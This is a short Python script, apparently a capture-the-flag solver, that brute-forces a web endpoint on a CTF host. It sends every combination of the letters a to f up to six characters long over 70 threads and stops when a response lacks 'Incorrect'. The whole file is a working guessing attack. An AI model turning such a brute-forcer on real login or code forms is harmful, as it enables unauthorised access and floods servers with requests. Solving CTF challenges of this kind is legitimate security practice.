import itertools
import requests
import concurrent.futures
import tqdm

def test_word(url, word):
    response = requests.get(f"{url}/enter={word}")

    if "Incorrect" not in response.text:
        print(f"Match found for word: {word}")
        print(f"Response: {response.text}")
        return word
    return None

def generate_wordlist_and_test(url, characters, max_length, max_workers=10):
    wordlist = []
    for length in range(1, max_length + 1):
        for combination in itertools.product(characters, repeat=length):
            word = ''.join(combination)
            wordlist.append(word)

    total_words = len(wordlist)
    progress = tqdm.tqdm(total=total_words, desc="Processing")

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(test_word, url, word): word for word in wordlist}

        for future in concurrent.futures.as_completed(futures):
            progress.update(1)
            result = future.result()
            if result:
                progress.close()
                print(f"Successful match found: {result}")
                return

    progress.close()
    print("No match found.")

url = "http://challenge.ctf.games:30571/"
characters = ['a', 'b', 'c', 'd', 'e', 'f']
max_length = 6
max_workers = 70

generate_wordlist_and_test(url, characters, max_length, max_workers)
